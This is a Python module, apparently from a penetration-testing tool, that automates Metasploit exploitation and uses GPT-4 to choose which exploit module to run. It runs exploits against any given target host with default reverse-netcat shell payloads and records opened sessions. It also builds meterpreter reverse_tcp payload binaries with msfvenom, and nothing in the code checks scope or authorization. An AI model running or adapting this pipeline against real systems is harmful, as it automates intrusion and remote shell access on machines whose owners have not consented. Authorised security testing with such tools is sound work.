"""Metasploit Framework integration with AI-powered exploit selection."""
from typing import Optional, List, Dict, Any
from pydantic import BaseModel
from loguru import logger
import subprocess
import json
import tempfile
from pathlib import Path
import re

from src.config import config
from src.scanner.models import Vulnerability


class MetasploitModule(BaseModel):
    """Metasploit module information."""
    name: str
    path: str
    description: str
    rank: str
    disclosure_date: Optional[str] = None
    references: List[str] = []
    targets: List[str] = []


class ExploitResult(BaseModel):
    """Result of Metasploit exploit attempt."""
    success: bool
    module_used: str
    output: str
    session_id: Optional[int] = None
    access_level: Optional[str] = None
    payload_type: Optional[str] = None
    error: Optional[str] = None


class MetasploitIntegrator:
    """Integrates Metasploit Framework with AI for intelligent exploit execution."""
    
    def __init__(self):
        self.msfconsole_path = self._find_msfconsole()
        self.msfvenom_path = self._find_msfvenom()
        
        if not self.msfconsole_path:
            logger.warning("Metasploit not found. Exploit functionality limited.")
    
    def _find_msfconsole(self) -> Optional[Path]:
        """Locate msfconsole binary."""
        possible_paths = [
            "/usr/bin/msfconsole",
            "/opt/metasploit-framework/bin/msfconsole",
            "/usr/local/bin/msfconsole",
        ]
        
        for path in possible_paths:
            if Path(path).exists():
                return Path(path)
        
        # Try which command
        try:
            result = subprocess.run(
                ["which", "msfconsole"],
                capture_output=True,
                text=True,
                timeout=5
            )
            if result.returncode == 0:
                return Path(result.stdout.strip())
        except:
            pass
        
        return None
    
    def _find_msfvenom(self) -> Optional[Path]:
        """Locate msfvenom binary."""
        try:
            result = subprocess.run(
                ["which", "msfvenom"],
                capture_output=True,
                text=True,
                timeout=5
            )
            if result.returncode == 0:
                return Path(result.stdout.strip())
        except:
            pass
        return None
    
    def search_modules(self, vulnerability: Vulnerability) -> List[MetasploitModule]:
        """Search Metasploit database for relevant modules."""
        if not self.msfconsole_path:
            logger.error("Metasploit not available")
            return []
        
        logger.info(f"Searching Metasploit modules for {vulnerability.type}")
        
        # Build search query based on vulnerability
        search_terms = self._build_search_terms(vulnerability)
        
        modules = []
        for term in search_terms:
            found_modules = self._execute_search(term)
            modules.extend(found_modules)
        
        # Remove duplicates
        unique_modules = {m.path: m for m in modules}
        
        logger.info(f"Found {len(unique_modules)} relevant Metasploit modules")
        return list(unique_modules.values())
    
    def _build_search_terms(self, vuln: Vulnerability) -> List[str]:
        """Build search terms based on vulnerability."""
        terms = []
        
        # Add CVE if available
        if vuln.cve_id:
            terms.append(vuln.cve_id)
        
        # Add vulnerability type
        vuln_type_map = {
            "rce": "remote code execution",
            "sqli": "sql injection",
            "xss": "cross site scripting",
            "ssrf": "server side request forgery",
            "xxe": "xml external entity",
            "lfi": "local file inclusion",
            "rfi": "remote file inclusion",
            "auth_failure": "authentication bypass",
            "broken_access_control": "privilege escalation"
        }
        
        if vuln.type in vuln_type_map:
            terms.append(vuln_type_map[vuln.type])
        else:
            terms.append(vuln.type)
        
        # Add technology/platform if identified
        if vuln.metadata:
            if "technology" in vuln.metadata:
                terms.append(vuln.metadata["technology"])
            if "platform" in vuln.metadata:
                terms.append(vuln.metadata["platform"])
        
        return terms
    
    def _execute_search(self, search_term: str) -> List[MetasploitModule]:
        """Execute msfconsole search command."""
        try:
            # Create resource file for msfconsole
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                f.write(f"search {search_term}\n")
                f.write("exit\n")
                rc_file = f.name
            
            # Run msfconsole with resource file
            result = subprocess.run(
                [str(self.msfconsole_path), "-q", "-r", rc_file],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            # Clean up
            Path(rc_file).unlink(missing_ok=True)
            
            # Parse output
            modules = self._parse_search_output(result.stdout)
            return modules
            
        except subprocess.TimeoutExpired:
            logger.error("Metasploit search timed out")
            return []
        except Exception as e:
            logger.error(f"Error searching Metasploit: {str(e)}")
            return []
    
    def _parse_search_output(self, output: str) -> List[MetasploitModule]:
        """Parse msfconsole search output."""
        modules = []
        lines = output.split('\n')
        
        # Find the table start
        in_results = False
        for line in lines:
            line = line.strip()
            
            if 'Matching Modules' in line:
                in_results = True
                continue
            
            if not in_results or not line:
                continue
            
            # Parse module line (format: #  Name  Disclosure Date  Rank  Check  Description)
            parts = re.split(r'\s{2,}', line)
            
            if len(parts) >= 4 and not line.startswith('=') and not line.startswith('#'):
                module = MetasploitModule(
                    name=parts[0].strip(),
                    path=parts[0].strip(),
                    description=parts[-1].strip() if len(parts) > 1 else "",
                    rank=parts[3].strip() if len(parts) > 3 else "normal",
                    disclosure_date=parts[1].strip() if len(parts) > 1 else None
                )
                modules.append(module)
        
        return modules
    
    def select_best_module_with_ai(self, vulnerability: Vulnerability, modules: List[MetasploitModule]) -> Optional[MetasploitModule]:
        """Use AI to select the most appropriate Metasploit module."""
        if not modules:
            return None
        
        if not config.openai_api_key:
            logger.warning("OpenAI API key not available. Using basic selection.")
            return self._select_best_module_basic(modules)
        
        logger.info("Using AI to select optimal Metasploit module")
        
        try:
            import openai
            client = openai.OpenAI(api_key=config.openai_api_key)
            
            # Build prompt for AI
            modules_info = "\n".join([
                f"{i+1}. {m.name} (Rank: {m.rank}, Description: {m.description[:100]})"
                for i, m in enumerate(modules[:10])  # Limit to top 10
            ])
            
            prompt = f"""
Given the following vulnerability and available Metasploit modules, select the BEST module to exploit it.

VULNERABILITY:
- Type: {vulnerability.type}
- Title: {vulnerability.title}
- Description: {vulnerability.description}
- Severity: {vulnerability.severity}
- CVE: {vulnerability.cve_id or 'N/A'}
- Location: {vulnerability.location}

AVAILABLE METASPLOIT MODULES:
{modules_info}

Respond with ONLY the number (1-{len(modules[:10])}) of the best module to use. Consider:
1. Exploit rank (excellent > great > good > normal > average > low > manual)
2. Relevance to vulnerability type
3. Disclosure date (newer is often better)
4. Description match

Response (number only):"""

            response = client.chat.completions.create(
                model="gpt-4",
                messages=[
                    {"role": "system", "content": "You are a penetration testing expert specializing in Metasploit Framework."},
                    {"role": "user", "content": prompt}
                ],
                temperature=0.3,
                max_tokens=10
            )
            
            # Parse response
            selection = response.choices[0].message.content.strip()
            try:
                index = int(selection) - 1
                if 0 <= index < len(modules[:10]):
                    selected = modules[index]
                    logger.info(f"AI selected module: {selected.name}")
                    return selected
            except ValueError:
                pass
            
            # Fallback to basic selection
            return self._select_best_module_basic(modules)
            
        except Exception as e:
            logger.error(f"AI module selection failed: {str(e)}")
            return self._select_best_module_basic(modules)
    
    def _select_best_module_basic(self, modules: List[MetasploitModule]) -> Optional[MetasploitModule]:
        """Select best module using basic heuristics."""
        if not modules:
            return None
        
        # Rank priority
        rank_priority = {
            "excellent": 6,
            "great": 5,
            "good": 4,
            "normal": 3,
            "average": 2,
            "low": 1,
            "manual": 0
        }
        
        # Sort by rank
        sorted_modules = sorted(
            modules,
            key=lambda m: rank_priority.get(m.rank.lower(), 0),
            reverse=True
        )
        
        return sorted_modules[0] if sorted_modules else None
    
    def exploit_vulnerability(
        self,
        vulnerability: Vulnerability,
        module: MetasploitModule,
        target_host: str,
        target_port: Optional[int] = None,
        payload: str = "cmd/unix/reverse_netcat",
        lhost: str = "127.0.0.1",
        lport: int = 4444
    ) -> ExploitResult:
        """Execute Metasploit exploit against target."""
        if not self.msfconsole_path:
            return ExploitResult(
                success=False,
                module_used=module.name,
                output="",
                error="Metasploit not available"
            )
        
        logger.info(f"Executing Metasploit module: {module.name}")
        
        try:
            # Create resource file with exploit commands
            rc_file = self._create_exploit_rc_file(
                module=module,
                target_host=target_host,
                target_port=target_port,
                payload=payload,
                lhost=lhost,
                lport=lport,
                vulnerability=vulnerability
            )
            
            # Execute msfconsole
            result = subprocess.run(
                [str(self.msfconsole_path), "-q", "-r", str(rc_file)],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            # Parse output
            exploit_result = self._parse_exploit_output(result.stdout, module.name)
            
            # Clean up
            rc_file.unlink(missing_ok=True)
            
            logger.info(f"Exploit execution completed. Success: {exploit_result.success}")
            return exploit_result
            
        except subprocess.TimeoutExpired:
            logger.error("Metasploit exploit timed out")
            return ExploitResult(
                success=False,
                module_used=module.name,
                output="",
                error="Exploit execution timed out"
            )
        except Exception as e:
            logger.error(f"Error executing exploit: {str(e)}")
            return ExploitResult(
                success=False,
                module_used=module.name,
                output="",
                error=str(e)
            )
    
    def _create_exploit_rc_file(
        self,
        module: MetasploitModule,
        target_host: str,
        target_port: Optional[int],
        payload: str,
        lhost: str,
        lport: int,
        vulnerability: Vulnerability
    ) -> Path:
        """Create Metasploit resource file for exploit."""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
            # Use the module
            f.write(f"use {module.path}\n")
            
            # Set RHOSTS
            f.write(f"set RHOSTS {target_host}\n")
            
            # Set RPORT if available
            if target_port:
                f.write(f"set RPORT {target_port}\n")
            
            # Set payload
            f.write(f"set PAYLOAD {payload}\n")
            
            # Set LHOST/LPORT for reverse shells
            if "reverse" in payload.lower():
                f.write(f"set LHOST {lhost}\n")
                f.write(f"set LPORT {lport}\n")
            
            # Add any vulnerability-specific parameters
            if vulnerability.parameter:
                f.write(f"set TARGETURI {vulnerability.location}\n")
            
            # Run exploit
            f.write("exploit -z\n")
            
            # Check sessions
            f.write("sessions -l\n")
            
            # Exit
            f.write("exit\n")
            
            return Path(f.name)
    
    def _parse_exploit_output(self, output: str, module_name: str) -> ExploitResult:
        """Parse Metasploit exploit output."""
        success = False
        session_id = None
        access_level = None
        
        # Check for successful exploitation indicators
        if "session" in output.lower() and "opened" in output.lower():
            success = True
            
            # Extract session ID
            session_match = re.search(r'session (\d+) opened', output, re.IGNORECASE)
            if session_match:
                session_id = int(session_match.group(1))
        
        # Check for meterpreter
        if "meterpreter" in output.lower():
            access_level = "meterpreter"
        elif "shell" in output.lower():
            access_level = "shell"
        
        # Check for failures
        error = None
        if "exploit failed" in output.lower():
            error = "Exploit failed to execute"
        elif "exploit aborted" in output.lower():
            error = "Exploit was aborted"
        elif "connection refused" in output.lower():
            error = "Connection refused by target"
        
        return ExploitResult(
            success=success,
            module_used=module_name,
            output=output,
            session_id=session_id,
            access_level=access_level,
            error=error
        )
    
    def generate_payload(
        self,
        payload_type: str = "linux/x64/meterpreter/reverse_tcp",
        lhost: str = "127.0.0.1",
        lport: int = 4444,
        format: str = "elf",
        output_file: Optional[Path] = None
    ) -> Optional[Path]:
        """Generate Metasploit payload using msfvenom."""
        if not self.msfvenom_path:
            logger.error("msfvenom not available")
            return None
        
        try:
            if not output_file:
                output_file = Path(tempfile.mktemp(suffix=f".{format}"))
            
            cmd = [
                str(self.msfvenom_path),
                "-p", payload_type,
                f"LHOST={lhost}",
                f"LPORT={lport}",
                "-f", format,
                "-o", str(output_file)
            ]
            
            logger.info(f"Generating payload: {payload_type}")
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0 and output_file.exists():
                logger.info(f"Payload generated: {output_file}")
                return output_file
            else:
                logger.error(f"Payload generation failed: {result.stderr}")
                return None
                
        except Exception as e:
            logger.error(f"Error generating payload: {str(e)}")
            return None
